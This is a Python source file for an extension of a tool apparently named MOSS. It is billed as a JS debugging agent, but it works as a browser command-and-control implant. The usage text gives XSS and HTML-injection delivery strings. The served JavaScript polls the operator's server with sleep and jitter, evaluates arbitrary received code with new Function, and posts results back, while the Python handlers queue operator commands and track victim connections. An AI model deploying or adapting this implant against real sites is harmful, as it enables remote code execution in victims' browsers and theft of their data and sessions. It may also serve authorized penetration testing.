"""
ext/debugger.py

Interactive JS Debugging Agent for MOSS.

Serves a JS payload for browser injection that executes JS commands
received from a TUI prompt and returns results. Uses rich for a
smoother TUI experience when available, with a plain input() fallback.

Usage:
    moss -e debugger -p 8000

    Then find a HTML injection: <script src="http://IP:8000/debugger/{RANDOM}"></script>
    
    Or an XSS: javascript:eval(fetch("http://IP:8000/debugger/{RANDOM}"))

CLI flags:
    --debugger-path PATH        URL path for the JS payload (use {RANDOM} for random segment, default: /debugger/{RANDOM})
    --debugger-id-length N      Length of the random path segment (default: 6)
    --debugger-no-input         Disable the TUI input thread (for testing)
    --debugger-minify-js                 Minify the JS payload with rjsmin (optional)
"""

from dataclasses import dataclass, field
from urllib.parse import urlsplit, parse_qs
import threading
import time
import json
import random

try:
    from rich.console import Console as RichConsole
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

GROUP = "debugger (ext/debugger.py)"

def _field(default, group=None, doc="", metadata={}, flags=[], choices=[], **kwargs):
    dwargs = {}
    if type(default).__name__ in ('function', 'type'):
        dwargs["default_factory"] = default
    else:
        dwargs["default"] = default
    return field(**dwargs, metadata=metadata | dict(group=group, doc=doc, flags=flags, choices=choices, **kwargs))

CORS = {"Access-Control-Allow-Origin": "*"}

# ────────────────────────────────────────────────
#   Browser Payload (eval-able JS)
# ────────────────────────────────────────────────

BROWSER_JS = """(function(){
  var base = '{DEBUGGER_BASE}';
  var lastId = -1;
  var polling = 0;
  var sleepy = 5;
  var jitter = 10;

  function generateId(length) {
    length = length || 6;
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var id = '';
    for (var i = 0; i < length; i++) {
      id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return id;
  }

  var nm = generateId();

  function schedule() {
    var baseDelay = sleepy * 1000;
    var range = baseDelay * jitter / 100;
    var delay = baseDelay + (Math.random() * 2 - 1) * range;
    setTimeout(function() {
      if (!polling) poll();
    }, delay);
  }

  function poll() {
    polling = 1;
    fetch(base + '{DEBUGGER_PATH}/pending?name=' + nm + '&last_id=' + lastId, {credentials: 'omit'})
      .then(function(res) {
        if (!res.ok) throw Error(res.status);
        return res.json();
      })
      .then(function(cmds) {
        cmds.forEach(function(m) {
          if (m.code.toLowerCase().startsWith('sleep ')) {
            var parts = m.code.split(' ');
            if (parts[1] && Number(parts[1])) sleepy = Number(parts[1]);
            if (parts[2] && Number(parts[2])) jitter = Number(parts[2]);
            return;
          }
          var result, error;
          try {
            var fn = new Function('return ' + m.code);
            result = fn();
            result = result === void 0 ? 'undefined' : String(result);
          } catch (e) {
            error = String(e);
          }
          var payload = {id: m.id, name: nm};
          if (error) {
            payload.error = error;
          } else {
            payload.result = result;
          }
          fetch(base + '{DEBUGGER_PATH}/result', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload),
            credentials: 'omit',
          }).catch(function() {});
          lastId = m.id;
        });
        polling = 0;
        schedule();
      })
      .catch(function() {
        polling = 0;
        schedule();
      });
  }

  poll();
})();"""


# ────────────────────────────────────────────────
#   Mixin — CLI flags, shared state, input thread
# ────────────────────────────────────────────────

BROWSER_TIMEOUT = 15

def random_id(n: int):
    return "".join(random.sample("abcdefghijkmnopqrstuvwxyz0123456789", n))


@dataclass
class DebuggerMixin:
    debugger_path: str = _field("/debugger/{RANDOM}", group=GROUP, flags=["--debugger-path"], doc="URL path for the interactive debugger JS payload. Use {RANDOM} to insert a random ID in the path")
    debugger_no_input: bool = _field(False, group=GROUP, flags=["--debugger-no-input"], doc="Disable the TUI input thread (for testing)")
    debugger_random_id_length: int = _field(6, group=GROUP, flags=["--debugger-id-length"], doc="The length of the random ID. Consider using the --block-scanners flag to mitigate against brute-forcing. Set to 0 to replace {RANDOM} with nothing")
    minify_js: bool = _field(False, group=GROUP, flags=["--debugger-minify-js"], doc="Minify the debugger JS payload using rjsmin")

    def __post_init__(self):
        self._pending = []
        self._results = []
        self._connections = {}
        self._lock = threading.Lock()
        self._next_id = 0
        self._shutdown = False
        self._last_browser_poll = 0.0
        self._browser_js = BROWSER_JS

        if self.debugger_random_id_length > 0:
            instance_id = random_id(self.debugger_random_id_length)
            self.debugger_path = self.debugger_path.replace("{RANDOM}", instance_id)
        else:
            self.debugger_path = self.debugger_path.replace("/{RANDOM}", "")
        self._browser_js = self._browser_js.replace("{DEBUGGER_PATH}", self.debugger_path)

        if not HAS_RICH:
            self.warning(f"debugger works best with the rich package:")
            self.warning(f"")
            self.warning(f"\tpip install rich")
            self.warning(f"")
            self.warning(f"This is an OPTIONAL dependency which makes the TUI feel smoother.")

        self._console = RichConsole() if HAS_RICH else None

        super().__post_init__()

        proto = 'https' if self.supports_https else 'http'
        hostname = self.hostname or ""

        if not self.hostname:
            self.warning("The debugger extension's browser agent uses --hostname to point to the server.")
            self.warning("Absence of a hostname may lead the agent failing to connect, particularly in no-origin contexts.")

        # If no hostname is provided, we use the empty string, which means paths in the browser will be treated as absolute paths.
        # For instance, fetch('/abc') makes a request to the /abc path at the browser's origin. This works for most browsers.
        # However, some contexts do NOT have an origin, such as isolated webviews on mobile.
        self._browser_js = self._browser_js.replace("{DEBUGGER_BASE}", f"{proto}://{hostname}:{self.port}")

        if self.minify_js:
            try:
                import rjsmin
                self._browser_js = rjsmin.jsmin(self._browser_js)
            except ImportError:
                self.warning(f"rjsmin not available — skipping JS minification:")
                self.warning(f"")
                self.warning(f"\tpip install rjsmin")

        if not self.debugger_no_input:
            self._start_input_thread()
        
        self.printstatus(f"[debugger] Debugger: {proto}://{hostname or '127.0.0.1'}:{self.port}{self.debugger_path}")

    def _print_result(self, r):
        name = r.get("name", "???")
        cid = r["id"]
        msg = f"  \u2717 ({name})[{cid}] {r['error']}" if r.get("error") else f"  \u2713 ({name})[{cid}] {r.get('result', 'undefined')}"
        if self._console:
            self._console.print(msg, style="red" if r.get("error") else "green")
        else:
            print(msg)

    def _drain_results(self):
        drained = []
        with self._lock:
            while self._results:
                drained.append(self._results.pop(0))
        for r in drained:
            self._print_result(r)

    def _start_input_thread(self):
        def _input_loop():
            while not self._shutdown:
                self._drain_results()
                try:
                    if self._console:
                        code = self._console.input(f"debug [{self._next_id}]> ")
                    else:
                        code = input(f"debug [{self._next_id}]> ")
                except (EOFError, KeyboardInterrupt):
                    break
                if not code.strip():
                    continue
                if time.time() - self._last_browser_poll > BROWSER_TIMEOUT:
                    print(f"(no browser connected — inject the debugger first)")
                    continue
                cmd_id = self._next_id
                self._next_id += 1
                with self._lock:
                    self._pending.append({"id": cmd_id, "code": code})

        t = threading.Thread(target=_input_loop, daemon=True)
        t.start()

# ────────────────────────────────────────────────
#   Processor — HTTP handlers
# ────────────────────────────────────────────────

class DebuggerProcessor:
    def get_services(self, server):
        return [(server.debugger_path.rstrip("/") + "/html", "launch browser-based callback")]

    def _base(self, req):
        return req.server.debugger_path.rstrip("/")

    def do_OPTIONS(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)
        if path in (base, base + "/pending", base + "/result"):
            req.send_response(200)
            req.send_header("Access-Control-Allow-Origin", "*")
            req.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            req.send_header("Access-Control-Allow-Headers", "Content-Type")
            req.send_header("Access-Control-Max-Age", "86400")
            req.end_headers()
            return True
        return None

    def do_GET(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)

        if path == base:
            req.send_response_full(200, content=req.server._browser_js, mime="text/javascript", headers=CORS)
            return True

        if path == base + "/html":
            content = f"<html><body><script>{req.server._browser_js}</script></body></html>"
            req.send_response_full(200, content=content, mime="text/html")
            return True

        if path == base + "/pending":
            qs = parse_qs(urlsplit(req.path).query)
            try:
                last_id = int(qs.get("last_id", [0])[0])
            except (ValueError, IndexError):
                last_id = 0
            # TODO: add reset logic if last_id >= server._next_id
            try:
                name = qs.get("name", [0])[0]
            except (ValueError, IndexError):
                name = "???"
            with req.server._lock:
                ip, _ = req.client_address
                conn_name = f'{ip}_{name}'
                if conn_name not in req.server._connections:
                    print(f"New connection: {conn_name}")
                req.server._connections[conn_name] = req.server._last_browser_poll = time.time()
                pending = [c for c in req.server._pending if c["id"] > last_id]
            body = json.dumps(pending).encode()
            req.send_response_full(200, content=body, mime="application/json", headers=CORS)
            return True

        return None

    def do_POST(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)
        # print('result!')

        if path == base + "/result":
            try:
                data = json.loads(req.body)
            except (json.JSONDecodeError, UnicodeDecodeError, ValueError):
                req.send_response_full(400, headers=CORS)
                return True
            if not isinstance(data, dict) or "id" not in data:
                req.send_response_full(400, headers=CORS)
                return True
            with req.server._lock:
                req.server._results.append(data)
                # req.server._pending = [c for c in req.server._pending if c["id"] != data["id"]]
            req.server._print_result(data)
            req.send_response_full(200, content=b'{"ok":true}', mime="application/json", headers=CORS)
            return True

        return None
